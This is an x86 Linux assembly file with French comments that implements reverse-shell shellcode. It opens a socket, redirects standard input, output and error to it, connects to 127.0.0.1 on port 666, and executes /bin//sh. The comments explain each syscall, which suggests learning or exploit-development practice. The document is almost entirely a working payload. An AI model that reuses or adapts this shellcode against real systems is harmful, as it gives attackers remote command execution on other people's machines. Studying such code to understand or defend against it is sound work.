_start:
    
    ; cree une socket
    xor    ebx, ebx ; ebx = 0
    xor    edx, edx ; edx = 0
    mov    al, 0x66 ; (syscall) eax = 102 correspond à sys_socketcall
		            ; dans /usr/include/x86_64-linux-gnu/asm/unistd_32.h
    
    ;arguments /usr/include/linux/net.h	et /usr/include/x86_64-linux-gnu/bits/socket.h
    ;man socket = int socket(int domain, int type, int protocol)
    ;creation du sockfd
    mov    ebx, 1   ; ebx = sys_socket dans net.h
    push   edx      ; 0 family protocol
    push   ebx      ; 1 (type de socket) = SOCK_STREAM = 1 dans socket.h
    push   2        ; 2 (domain) AF_INET = PF_INET = 2  IP protocol family dans socket.h
    mov    ecx, esp ; ecx = adresse des args (esp) 2
    int    0x80	    ; execute le syscall 			
    
    xchg   eax, ebx ; ebx = sockfd (socket file descriptor) adresse 
    pop    ecx      ; ecx=2
    ;https://www.freebsd.org/doc/en ... handbook/sockets-essential-functions.html
    ;python struct.pack('<Q', 666) = little endian 0x9A2

    push   0x100007f    ; 1.0.0.127 little endian, sa.sin_addr = inet_addr("127.0.0.1")
    push   word 0x9A02  ; 0x9A02  666 en little endian sa.port = htons(666)
    push   word cx      ; sa.family   = AF_INET = ecx


_cp:
    ; boucle copie le fd dans stdin/out/err  0 1 2
    mov    al, 0x3f ; (syscall) eax = 63 NR_dup2   man dup2 copie un fd
    int    0x80     ; execute le syscall
    dec    ecx      ; ecx = ecx-1
    jns    _cp      ; jump if not signed, si > 0 pas d'input
        	    ; http://www.penguin.cz/~literakl/intel/j.html
    

    ;socket connect >  man connect
    ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  ;https://www.freebsd.org/doc/en ... handbook/sockets-essential-functions.html
    mov    ecx, esp   ; ecx = adresse de sa
    mov    al, 0x66   ; (syscall) sys_socketcall
    push   0x10       ; sizeof(sa)
    push   ecx        ; push adresse de sa
    push   ebx        ; sockfd
    mov    ecx, esp   ; adresse de args
    push   3	      ; sockfd 
    pop    ebx        ; ebx=sys_connect
    int    0x80
    
    ; connection au serveur avec execve > man execve
    ; int execve(const char *filename, char *const argv[],char *const envp[]); 
    ; /bin/sh
    mov    al, 0xb    ; (syscall) eax=sys_execve
    push   edx        ; '\0'
    push   0x68732f2f ; "hs//"
    push   0x6e69622f ; "nib/"
    mov    ebx, esp   ; ebx="/bin//sh", 0
    xor    ecx, ecx   ; ecx=0
    int    0x80       ; exec sys_execve
    
    
  

